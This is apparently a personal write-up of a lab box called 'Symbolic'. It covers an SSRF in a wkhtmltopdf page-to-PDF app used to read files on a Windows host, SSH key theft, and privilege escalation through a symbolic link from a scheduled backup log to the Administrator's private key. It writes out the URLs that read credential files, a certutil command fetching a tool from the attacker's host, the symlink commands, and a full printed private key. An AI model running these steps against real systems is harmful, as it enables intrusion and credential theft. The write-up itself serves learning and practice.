#box #SSRF #LFI #certutil #symbolic-links #CreateSymlink #mklink #ssh-key-authentication 

Symbolic is a machine that involves a SSRF to LFI vulenrability in the `wkhtmltopdf` application. This application consists in creating a pdf from a html file. It permits us, throughout a SSRF to read the content of the target machine and exploit the ssh key of the user running the application. The user running the application must be understood from the web application hint, but once is done, the LFI is granted and accessing its authorized_keys just demands some google research. Once on the target machine, a folder in C:\Backup executes a script every minute that catches the requests reaching the webapplication and archives them in the Logs folder of the Backup folder. Creating a SymbolicLink (yea, apparently this can be done also on Windows) targeting the private key of the administrator, leads us to gaining its private key and being able to authenticate as administrator of the machine.

## Nmap

Nmap doesn't give us so much space, SSH and HTTP. Means we'll start with HTTP.
```bash
# Nmap 7.95 scan initiated Tue Jun 10 11:28:35 2025 as: /usr/lib/nmap/nmap -sCV --min-rate=10000 -o nmap_sCV 192.168.239.177
Nmap scan report for 192.168.239.177
Host is up (0.038s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 3e:40:e2:ef:21:ea:c1:77:b6:14:a3:f7:04:59:45:28 (RSA)
|   256 f8:fb:e3:c6:16:3a:e2:62:d0:e2:ae:d4:f2:9e:6f:6d (ECDSA)
|_  256 94:5e:97:ad:f9:0f:81:b6:6b:3b:bd:98:43:c0:0d:6a (ED25519)
80/tcp open  http    Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: WebPage to PDF

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jun 10 11:28:49 2025 -- 1 IP address (1 host up) scanned in 13.51 seconds
```

## HTTP

We instantly recognize that we have in front a tool called `wkhtmltopdf`, once we google for its vulnerabilities we find the following one: https://exploit-notes.hdks.org/exploit/web/security-risk/wkhtmltopdf-ssrf/. Following the guide we create a file containing the php script and we the run a webserver on our machine that will be responsible to reflect the call made to our script with our injected payload. Here, instead of relying to Iframe as mentioned below, we simply perform the request as a plain request inside the textbox asking for a URL. The application will automatically perform a SSRF giving us what we want, avoiding the Iframe stuff.
As a PoC, we try with the following URL `http://192.168.45.213:8000/toast.php?x=/Windows/System32/Drivers/etc/hosts`. This request will print us, in clear, the hosts file of the target machine.
## Foothold

Known that, we've got a SSRF Vulnerability that grants us LFI basically. We also know that the machine has SSH on it. 
I've first tried with %USERPROFILE%, but it seemed not to be working when performing this kind of attack. Probably the browser is unable to parse the environment variables of the machine, fact is I had to check online for the user cause I had no clue on how to proceed.
Funny as it is, the hint was in clear sight and the user was that `p4yl0ad` readable in the application's homepage (that didn't seem an user at all, to be honest)

![[attachments/symbolic-writeup-1.webp]]

Thus, we now try to get the keys of that user, at least the private one, to be able to authenticate successfully to the target machine (actually the private key can also be found by enumerating the application. It's hidden in one of the printed PDFs in the `/pdfs/` folder).
We try with `http://192.168.45.213:8000/toast.php?x=/Users/p4yl0ad/.ssh/id_rsa` and we get the needed key to authenticate.

We add the key onto a file, we `chmod 600 $keyfile` and we then perform a key authentication in ssh to the target machine:

```bash
ssh -i id_rsa p4yl0ad@$ip
```
## Privilege Escalation

The Privilege Escalation path requires a knowledge of Symbolic Links. We do not have a lot of rights on the target machine and what we can do doesn't lead us anywhere.
However, we find a folder Backup, in C:\ that contains a `ps1` scripts that is ran every 60 seconds. What it does is copying the `request.log` file in `C:\backup\logs`.
What can be done is creating a symbolic link that redirects the request log content to the private key of administrator in order to, once again, authenticate in SSH but this time as Administrator.
To do so, we require the following [suite](https://github.com/googleprojectzero/symboliclink-testing-tools/tree/main) from googleprojectzero. This is outdated at the time of writing, but for our purpose it's more than useful.

Once the `Release.7z` file is downloaded, we unzip it and we then pass it to the target machine:
```shell
certutil -urlcache -f http://192.168.45.213:8000/CreateSymlink.exe CreateSymlink.exe
```

We then use the help function to understand how to use the executable
```shell
p4yl0ad@SYMBOLIC C:\backup>.\CreateSymlink.exe -h
CreateSymlink [-p] symlink target [baseobjdir]
Example: C:\path\file c:\otherpath\otherfile
```

We then try it, with the normal use, but an error comes after:

```shell
.\CreateSymlink.exe -p C:\xampp\htdocs\logs\request.log C:\Users\Administrator\.ssh\id_rsa
Error creating junction 145
```

On new systems, the same symbolic link can be created with the utility `mklink`. If we replicate the same behaviour with that it clearly tells us what is going wrong

```shell
mklink C:\xampp\htdocs\logs\request.log C:\Users\Administrator\.ssh\id_rsa 
# Cannot create a file when that file already exists.
```

We try then to remove the `request.log` file, and in this case it clearly tells us we do not have the rights to perform this operation

```shell
mklink C:\xampp\htdocs\logs\request.log C:\Users\Administrator\.ssh\id_rsa 
# You do not have sufficient privilege to perform this operation.
```

We then hop again into using the CreateSymlink tool found earlier and try again in this situation:

```shell
.\CreateSymlink.exe -p C:\xampp\htdocs\logs\request.log C:\Users\Administrator\.ssh\id_rsa
```

It worked! Now we shall wait a minute or trigger the `backup.ps1` file and we should theoretically get the private key of the Administrator.

![[attachments/symbolic-writeup-2.webp]]

Due to the dimension of the fill, I'll guess we'll try to type this file.

```bash
p4yl0ad@SYMBOLIC C:\backup\logs>type 06-11-2025_12_04_0 
-----BEGIN OPENSSH PRIVATE KEY----- 
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAxxA5qirPy3e1f5k4mL/3P1zBuVAgVPk4AZhptq1oyUsnNC4y0E3e
AVQvcLFty21pVg8Dd4MBhE1SQqrCGN1pIoWcIPGRlvbDOmGaXFk3ow5IYcu5nkw0L6u2ML
EO3SomD4bP1Z112FBbYA8KAymItR39M2QPKYXAHF1wNxZlWQjhVEmhKZVCLYubgECimTje
43EZ6NxELnftirOUhTFAecXIqo9FPyUpXh3ltMqR3mupeBLp7cblubMa5sV1P9v4xjxJRj
WaL0aAb4OjS67bKG2HEoWWY7JHrjUKCzOpQpHvz7u00MroNa31SHu6XDBraREzZeZ+zdse
fFcZdflKRwAAA9CAteVYgLXlWAAAAAdzc2gtcnNhAAABAQDHEDmqKs/Ld7V/mTiYv/c/XM
G5UCBU+TgBmGm2rWjJSyc0LjLQTd4BVC9wsW3LbWlWDwN3gwGETVJCqsIY3WkihZwg8ZGW
9sM6YZpcWTejDkhhy7meTDQvq7YwsQ7dKiYPhs/VnXXYUFtgDwoDKYi1Hf0zZA8phcAcXX
A3FmVZCOFUSaEplUIti5uAQKKZON7jcRno3EQud+2Ks5SFMUB5xciqj0U/JSleHeW0ypHe
a6l4EuntxuW5sxrmxXU/2/jGPElGNZovRoBvg6NLrtsobYcShZZjskeuNQoLM6lCke/Pu7
TQyug1rfVIe7pcMGtpETNl5n7N2x58Vxl1+UpHAAAAAwEAAQAAAQBXP/hWap9baiPGQq04
3mMLhadvhvw04ms238vuAsG8ANG1IE6rWIXnBTQp68rY8CLMUpZNasFecNmOWPPsHBe5xu
Aw3FDY312gmCklMwGc2WTGYJoCFRqGjnezjdea/p9iDM/JrFN7tXTnfJAB5NGDuRpCzSeM
JpCWninSK2HOjLygldNiJCjmFhl5YJ2IU1GjSMDtNUo3VavCcrQ+FxB+L2eG7FHiHo3+Be
McSGCOLBf1YokbXV88Se9ofnJyi+Ddsg9+v4vQfSZ958m/gSAoqxkg0KtWR45lpMpSN03k
Hx8mb3jQTJhuT07GRXiZIJ5RVmO0f6wNH6KzACnD7J9ZAAAAgQCvUJUJwYSUvI0rNSXQMz
tieT0IZq7oFiQISKjfAED0zLWm3s9ML8BZ3ArWomZinsHont1Pr1Q0nXhLB/UEqECMpkDf
Rnr+MssfPXMh/BHmsIcAzqT0MoG1NIeF3dRWQbo4ZmxDZQ3YJhfrstVzmho9qZWx2ZXyPs
sA7HCDqBV1CQAAAIEA754ugprmrQCFcR2DqV52ejK1MARGxYlNq980hUplnlV1oE2hrbzs
AJ2dDHXRnllAAWJDQtJvYlj3w9C7p4bXKnczXXAKwa0MCtyz1h0TGyn63k8L0+BxKXnOET
NDHrBJ06pBdJpf5TCX0Uz4siCTOibDVol2gZbQkFkDLtV/y/MAAACBANSsQQgd8rBIxsBB
lZnID93TvwWniL8i7v/IHiuALGMGLqaXTb8FYPNhlOZPQmpE3SzstosCAmf+dypTYa1qm3
PK16UBRBIkltnlfuRDBKqLWtI5MoPhArWelEyd/xpLAvMcMcsS8bh2TJe8jfo1dC8TcCNm
va4M+FKZegkfjsFdAAAAFmFkbWluaXN0cmF0b3JAU1lNQk9MSUMBAgME
-----END OPENSSH PRIVATE KEY-----
```

We copy this text onto our machine, we `chmod 600 id_rsa_administrator` and we then authenticate again, in ssh, as an administrator, gaining administrator of the machine.

# TIL

* Apparently you can create Symbolic Links also on Windows. This can be done either with `mklink` on new windows version or with `CreateSymlink.exe`. The latter seems to exploit a privilege vulnerability since it can work sometimes where mklink doesnt due to privileges lacks.